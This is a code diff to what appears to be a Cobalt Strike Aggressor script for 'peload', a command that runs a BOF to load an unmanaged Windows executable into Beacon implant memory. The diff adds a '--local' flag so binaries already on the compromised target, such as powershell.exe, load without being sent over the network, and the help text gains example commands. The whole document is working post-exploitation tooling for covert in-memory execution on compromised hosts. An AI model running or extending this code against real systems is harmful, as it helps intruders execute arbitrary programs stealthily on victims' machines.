@@ -425,11 +425,12 @@ Usage:   petable <optional arg>
 
 alias peload
 {
-    local('$bid $barch $PE $args $x $matchfound');
+    local('$bid $barch $PE $args $x $matchfound $local $pename');
 
     $bid = $1;
+    $local = 0;
 
-    if(1 > size(@_) || 2 < size(@_) )
+    if(2 > size(@_) || 3 < size(@_) )
     {
         berror($bid, "Invalid number of arguments");
         berror($bid, beacon_command_detail("peload"));
@@ -472,26 +473,51 @@ alias peload
         berror($bid, "This beacon already has a loaded PE: " . @loadedPE[$x][2]);
         exit();
     }
-    else if(!-exists $2)
+
+    #check to see if the local flag was used meaning we aren't going to try and read in and send a PE over the wire
+    if(lc($3) eq "--local")
+    {
+        $local = 1;
+    }
+
+    #If the specified file doesn't exist on the attack machine and we didn't specify this was a local file on the remote machine, error
+    if(!-exists $2 && !$local)
     {
         berror($bid, "Specified executable does not exist!\n");
         exit();
     }
     else
     {
-        # read in the right BOF file
-        $handle = openf($2);
-        $PE   = readb($handle, -1);
-        closef($handle);
+        $pename = "";
+        $PE = "";
+        if($local == 1)
+        {
+            #create pename by splitting on backslash (because Windows paths use backslashes)
+            $pename = split('\\\\', $2, 50)[-1];
+
+            #If we are loading a local PE from the target, just pass in the path given as an argument
+            $PE = $2;
+        }
+        else
+        {
+            # read in the right BOF file
+            $handle = openf($2);
+            $PE   = readb($handle, -1);
+            closef($handle);
+
+            #create pename by splitting on forward slash (because Linux path's use forward slashes)
+            $pename = split("/", $2, 50)[-1];
+        }
+
 
         #Create array in @loadedPE to store PE data.
         #Values: BeaconID, PID, PEname, User, Date/Time, pMemAddrStruct, Timeout, UnloadLibraries, Aborted
-        action("peload" . " ~*~ " . $bid . " ~*~ " . binfo($bid, "pid") . " ~*~ " . split("/", $2, 50)[-1] . " ~*~ " . mynick() . " ~*~ " . tstamp(ticks()) . " ~*~ " . "null" . " ~*~ " . "60" . " ~*~ " . "TRUE" . " ~*~ " . "FALSE");
+        action("peload" . " ~*~ " . $bid . " ~*~ " . binfo($bid, "pid") . " ~*~ " . $pename . " ~*~ " . mynick() . " ~*~ " . tstamp(ticks()) . " ~*~ " . "null" . " ~*~ " . "60" . " ~*~ " . "TRUE" . " ~*~ " . "FALSE");
 
         #Set issuedcommand bool to TRUE so we print messages when we get feeback from BOF;
         $issuedcommand = 1;
 
-        loadpe($bid, $PE);
+        loadpe($bid, $PE, $local);
     }
 }
 
@@ -505,7 +531,7 @@ sub loadpe{
     closef($handle);
 
     # Pack the arguments
-    $args = bof_pack($1, "bz", $2, $key);
+    $args = bof_pack($1, "bzi", $2, $key, $3);
 
     # Execute BOF
     beacon_inline_execute($1, $data, "go", $args);
@@ -519,10 +545,13 @@ Command: peload
 Summary: This command will run a BOF to load an unmanaged PE into Beacon memory.
          Supports x64 C or C++ binaries compiled with mingw or visual studio.  Binaries outside these parameters are untested. 
 
-Usage:   peload </path/to/binary.exe>
+Usage:   peload </path/to/binary.exe> <--local>
          </path/to/binary.exe>        Required. Full path to the windows EXE you wish you load into the Beacon.
+         <--local>                    Optional. This flag specifies that the binary should be loaded from the target machine instead of the attack machine
 
          Example: peload /root/windows_binaries/dsquery_win7.exe
+         Example: peload C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe --local
+         Example: peload \"C:\\program files\\peazip\\peazip.exe\" --local
 "
 );
 
